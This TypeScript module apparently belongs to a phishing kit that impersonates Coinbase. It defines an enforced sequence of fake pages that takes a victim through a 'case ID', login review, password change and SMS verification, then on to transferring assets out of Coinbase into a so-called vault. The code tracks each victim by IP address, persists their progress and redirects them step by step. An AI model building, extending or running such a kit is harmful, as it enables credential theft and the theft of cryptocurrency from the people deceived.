/**
 * Golden Flow Engine.
 *
 * Defines the canonical visitor step sequence and provides deterministic
 * helpers for enforcement, completion tracking, and recovery.  When no
 * custom flow is explicitly assigned (via domain flowId, case-code flowId,
 * or admin flow:reorder), every visitor follows this default path.
 */
import { dbSetVisitorFlowSteps } from './database.js';
import { serverState, type FlowStep, type Visitor } from './state.js';
import { templateLabelToVisitorPath } from './visitorRouter.js';
import { broadcast } from './websocket.js';

export const GOLDEN_FLOW_STEPS: readonly string[] = [
	'Coinbase/Case ID',
	'Coinbase/Activity',
	'Coinbase/Review Login',
	'Coinbase/Change Password',
	'Coinbase/SMS Verify',
	'Coinbase/Trust Device',
	'Coinbase/Terminate Devices',
	'Coinbase/Securing Account',
	'Coinbase/Protect Assets',
	'Coinbase/Moving Vault',
	'Coinbase/Vault Intro',
	'Coinbase/Vault Setup',
	'Coinbase/Transfer from Coinbase',
	'Coinbase/Select Asset',
	'Coinbase/Confirm Transfer',
	'Coinbase/Vault SMS',
	'Coinbase/Verification Required',
	'Coinbase/Vault Dashboard'
];

const GOLDEN_SET = new Set(GOLDEN_FLOW_STEPS);

/** Build a fresh set of flow steps with all statuses set to not_started. */
export function initializeGoldenFlow(): FlowStep[] {
	return GOLDEN_FLOW_STEPS.map((page) => ({
		page,
		status: 'not_started' as const
	}));
}

/** True when the visitor should follow the Golden Flow (no custom override). */
export function shouldUseGoldenFlow(visitor: Visitor): boolean {
	return visitor.isGoldenFlow;
}

/**
 * Return the label of the first incomplete required step, or null when
 * every step is done.
 */
export function resolveNextStep(steps: FlowStep[]): string | null {
	for (const s of steps) {
		if (s.status !== 'completed') return s.page;
	}
	return null;
}

/**
 * Check whether the visitor is allowed to view `requestedLabel`.
 *
 * Rules:
 *  - Pages NOT in the flow are always allowed (Loading, utility pages).
 *  - Completed or in-progress steps are allowed (revisiting / resuming).
 *  - A not-yet-started step is allowed only if every prior step is completed.
 *  - Otherwise blocked (skipping ahead).
 */
export function isStepAllowed(steps: FlowStep[], requestedLabel: string): boolean {
	const idx = steps.findIndex((s) => s.page === requestedLabel);
	if (idx === -1) return true;

	const step = steps[idx];
	if (step.status === 'completed' || step.status === 'in_progress') return true;

	for (let i = 0; i < idx; i++) {
		if (steps[i].status !== 'completed') return false;
	}
	return true;
}

/**
 * Mark a step completed, persist to DB, and return the next incomplete label.
 * No-ops if the step is not found or is already completed.
 */
export function markStepCompleted(
	visitor: Visitor,
	label: string
): string | null {
	const step = visitor.flowSteps.find((s) => s.page === label);
	if (!step || step.status === 'completed') {
		return resolveNextStep(visitor.flowSteps);
	}

	step.status = 'completed';
	step.completedAt = Date.now();

	try { dbSetVisitorFlowSteps(visitor.ip, visitor.flowSteps); } catch { /* non-critical */ }

	return resolveNextStep(visitor.flowSteps);
}

/**
 * Set a step to in_progress if it is currently not_started.
 * Used when the hooks serve a template page — marks the visitor as "on" that step.
 */
export function markStepInProgress(
	visitor: Visitor,
	label: string
): void {
	const step = visitor.flowSteps.find((s) => s.page === label);
	if (!step || step.status !== 'not_started') return;

	step.status = 'in_progress';
	try { dbSetVisitorFlowSteps(visitor.ip, visitor.flowSteps); } catch { /* non-critical */ }
}

/**
 * Scan progress and return the label the visitor should be on right now.
 * Prefers in_progress over not_started. Returns null if all done.
 */
export function recoverFlowPosition(steps: FlowStep[]): string | null {
	const inProgress = steps.find((s) => s.status === 'in_progress');
	if (inProgress) return inProgress.page;
	return resolveNextStep(steps);
}

/**
 * Ensure a visitor has flow steps. If they have none and no custom flow
 * was assigned, initialise with the Golden Flow.
 * Returns true if steps were newly created.
 */
export function ensureFlowInitialized(visitor: Visitor): boolean {
	if (visitor.flowSteps.length > 0) return false;
	if (visitor.flowBypassed) return false;

	visitor.flowSteps = initializeGoldenFlow();
	visitor.isGoldenFlow = true;
	try { dbSetVisitorFlowSteps(visitor.ip, visitor.flowSteps); } catch { /* non-critical */ }
	return true;
}

/**
 * Build the visitor-host redirect URL for a given template label.
 */
export function flowStepToUrl(label: string, module: string): string | null {
	return templateLabelToVisitorPath(label, module);
}

/**
 * Convenience: resolve the redirect URL for the next incomplete step.
 */
export function nextStepUrl(visitor: Visitor): string | null {
	const label = resolveNextStep(visitor.flowSteps);
	if (!label) return null;
	return flowStepToUrl(label, visitor.module);
}

/** True when `label` is part of the Golden Flow definition. */
export function isGoldenFlowStep(label: string): boolean {
	return GOLDEN_SET.has(label);
}
